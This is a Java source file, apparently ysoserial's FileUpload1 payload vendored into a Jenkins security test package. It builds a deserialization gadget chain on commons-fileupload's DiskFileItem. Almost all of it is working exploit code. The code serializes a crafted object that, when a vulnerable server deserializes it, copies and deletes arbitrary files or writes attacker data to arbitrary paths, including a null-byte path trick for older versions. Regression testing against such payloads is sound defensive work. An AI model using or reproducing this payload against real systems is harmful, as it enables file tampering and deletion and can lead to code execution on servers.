/*
 * The MIT License
 *
 * Copyright (c) 2013 Chris Frohoff
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
 * THE SOFTWARE.
 */

package jenkins.security.security218.ysoserial.payloads;


import java.io.File;
import java.io.IOException;
import java.io.OutputStream;
import java.util.Arrays;

import org.apache.commons.codec.binary.Base64;
import org.apache.commons.fileupload.disk.DiskFileItem;
import org.apache.commons.io.output.DeferredFileOutputStream;
import org.apache.commons.io.output.ThresholdingOutputStream;

import jenkins.security.security218.ysoserial.payloads.annotation.Dependencies;
import jenkins.security.security218.ysoserial.payloads.annotation.PayloadTest;
import jenkins.security.security218.ysoserial.payloads.util.PayloadRunner;
import jenkins.security.security218.ysoserial.payloads.util.Reflections;

/**
 * Gadget chain:
 * DiskFileItem.readObject()
 * 
 * Arguments:
 * - copyAndDelete;sourceFile;destDir
 * - write;destDir;ascii-data
 * - writeB64;destDir;base64-data
 * - writeOld;destFile;ascii-data
 * - writeOldB64;destFile;base64-data
 * 
 * Yields:
 * - copy an arbitraty file to an arbitrary directory (source file is deleted if possible)
 * - pre 1.3.1 (+ old JRE): write data to an arbitrary file
 * - 1.3.1+: write data to a more or less random file in an arbitrary directory
 * 
 * @author mbechler
 */
@Dependencies ( {
    "commons-fileupload:commons-fileupload:1.3.1",
    "commons-io:commons-io:2.4"
} )
@PayloadTest(harness="ysoserial.payloads.FileUploadTest")
public class FileUpload1 implements ReleaseableObjectPayload<DiskFileItem> {

    public DiskFileItem getObject ( String command ) throws Exception {

        String[] parts = command.split(";");

        if ( parts.length == 3 && "copyAndDelete".equals(parts[ 0 ]) ) {
            return copyAndDelete(parts[ 1 ], parts[ 2 ]);
        }
        else if ( parts.length == 3 && "write".equals(parts[ 0 ]) ) {
            return write(parts[ 1 ], parts[ 2 ].getBytes("US-ASCII"));
        }
        else if ( parts.length == 3 && "writeB64".equals(parts[ 0 ]) ) {
            return write(parts[ 1 ], Base64.decodeBase64(parts[ 2 ]));
        }
        else if ( parts.length == 3 && "writeOld".equals(parts[ 0 ]) ) {
            return writePre131(parts[ 1 ], parts[ 2 ].getBytes("US-ASCII"));
        }
        else if ( parts.length == 3 && "writeOldB64".equals(parts[ 0 ]) ) {
            return writePre131(parts[ 1 ], Base64.decodeBase64(parts[ 2 ]));
        }
        else {
            throw new IllegalArgumentException("Unsupported command " + command + " " + Arrays.toString(parts));
        }
    }


    public void release ( DiskFileItem obj ) throws Exception {
        // otherwise the finalizer deletes the file
        DeferredFileOutputStream dfos = new DeferredFileOutputStream(0, null);
        Reflections.setFieldValue(obj, "dfos", dfos);
    }

    private static DiskFileItem copyAndDelete ( String copyAndDelete, String copyTo ) throws IOException, Exception {
        return makePayload(0, copyTo, copyAndDelete, new byte[1]);
    }


    // writes data to a random filename (update_<per JVM random UUID>_<COUNTER>.tmp)
    private static DiskFileItem write ( String dir, byte[] data ) throws IOException, Exception {
        return makePayload(data.length + 1, dir, dir + "/whatever", data);
    }


    // writes data to an arbitrary file
    private static DiskFileItem writePre131 ( String file, byte[] data ) throws IOException, Exception {
        return makePayload(data.length + 1, file + "\0", file, data);
    }


    private static DiskFileItem makePayload ( int thresh, String repoPath, String filePath, byte[] data ) throws IOException, Exception {
        // if thresh < written length, delete outputFile after copying to repository temp file
        // otherwise write the contents to repository temp file
        File repository = new File(repoPath);
        DiskFileItem diskFileItem = new DiskFileItem("test", "application/octet-stream", false, "test", 100000, repository);
        File outputFile = new File(filePath);
        DeferredFileOutputStream dfos = new DeferredFileOutputStream(thresh, outputFile);
        OutputStream os = (OutputStream) Reflections.getFieldValue(dfos, "memoryOutputStream");
        os.write(data);
        Reflections.getField(ThresholdingOutputStream.class, "written").set(dfos, data.length);
        Reflections.setFieldValue(diskFileItem, "dfos", dfos);
        Reflections.setFieldValue(diskFileItem, "sizeThreshold", 0);
        return diskFileItem;
    }


    public static void main ( final String[] args ) throws Exception {
        PayloadRunner.run(FileUpload1.class, args);
    }

}
